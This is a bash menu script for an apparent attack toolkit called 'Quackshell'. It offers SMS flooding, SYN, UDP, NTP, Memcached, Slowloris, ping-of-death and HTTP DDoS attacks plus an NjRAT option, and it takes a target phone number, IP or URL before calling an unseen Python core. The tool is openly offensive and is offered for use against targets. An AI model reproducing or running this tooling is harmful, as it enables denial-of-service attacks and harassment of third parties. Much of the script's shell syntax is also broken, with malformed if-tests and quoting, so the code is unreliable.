pwd=$(pwd)
source ${pwd}/svar.sh
function banner {
sleep 0.5
clear
echo -e "${white}

  █████   █    ██  ▄▄▄       ▄████▄   ██ ▄█▀
▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░ ░ ██████░░██░░██ ▓█████ ░██▓  ░  ██▓░   ░
 ░ ▒██    ▒░▓██░ ██▒▓█   ▀ ▓██▒  ░ ▓██▒     
   ░ ▓██▄  ░▒██▀▀██░▒███   ▒██░    ▒██░     
     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░     
   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒ 
   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░ 
   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░ 
   ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░    
         ░   ░  ░  ░   ░  ░    ░  ░    ░  ░ 

      by aboutBlank from White Phoenix      
          GitHub: @whitephoenixofc          
"
sleep 1
}

function menu {
echo -e "${green}

             Quackshell Options:        
   
${green}[${yellow}01${green}] ${white}SMS Attack              ${green}[${yellow}06${green}] ${white}POD Attack
${green}[${yellow}02${green}] ${white}NTP Attack              ${green}[${yellow}07${green}] ${white}Slowloris 
${green}[${yellow}03${green}] ${white}TCP Attack              ${green}[${yellow}08${green}] ${white}Memcached 
${green}[${yellow}04${green}] ${white}UDP Attack              ${green}[${yellow}09${green}] ${white}HTTP DDoS 
${green}[${yellow}05${green}] ${white}SYN Attack              ${green}[${yellow}10${green}] ${white}NjRAT    
 
"${white}
echo -e -n "${green}
Select option: "${white}
read -r option
if ${option} == "01" || ${option} == "1"]]; then
quacksms
elif ${option} == "02" || ${option} == "2"]]; then
quacktype="NTP"
quackip
elif ${option} == "03" || ${option} == "3"]]; then
quacktype="TCP"
quackip
elif ${option} == "04" || ${option} == "4"]]; then
quacktype="UDP"
quackip
elif ${option} == "05" || ${option} == "5"]]; then
quacktype="SYN"
quackip
elif ${option} == "06" || ${option} == "6"]]; then
quacktype="POD"
quackip
elif ${option} == "07" || ${option} == "7"]]; then
quacktype="SLOWLORIS"
quackip
elif ${option} == "08" || ${option} == "8"]]; then
quacktype="MEMCACHED"
quackip
elif ${option} == "09" || ${option} == "9"]]; then
quackhttp
elif ${option} == "10" || ${option} == "10"]]; then
quacktype="NJRAT"
quackip
else echo -e "${red}Invalid option"${white}
sleep 0.5
clear
banner
menu
fi
}

function quacksms {
read -p '${green}Target number: '${white} target
read -p '${green}Timeout: '${white} timeout
read -p '${green}Threads: '${white} threads

read -r continue "
${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}, Threads: ${yellow}${threads}

${white}Continue? y/N - "${yellow}

if [[$continue == y || $continue == Y"]]; then
cd core
python quack --tool SMS --target ${target} --timeout ${timeout} --threads ${threads}
cd
banner
menu
else
banner
menu
fi
}

function quackip {
read -p '${green}Target IP: '${white} target
read -p '${green}Timeout: '${white} timeout
read -p '${green}Threads: '${white} threads

read -r continue "
${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}, Threads: ${yellow}${threads}

${white}Continue? y/N - "${yellow}

if [[$continue == y || $continue == Y"]]; then
cd core
python quack --tool ${quacktype} --target ${target} --timeout ${timeout} --threads ${threads}
cd
banner
menu
else
banner
menu
fi
}

function quackhttp {
read -p '${green}Target URL: '${white} target
read -p '${green}Timeout: '${white} timeout
read -p '${green}Threads: '${white} threads

read -r continue "
${green}Target: ${yellow}${target}${green}, Timeout: ${yellow}${timeout}${green}, Threads: ${yellow}${threads}

${white}Continue? y/N - "${yellow}

if [[$continue == y || $continue == Y"]]; then
cd core
python quack --tool HTTP --target ${target} --timeout ${timeout} --threads ${threads}
cd
banner
menu
else
banner
menu
fi
}
# start
banner
menu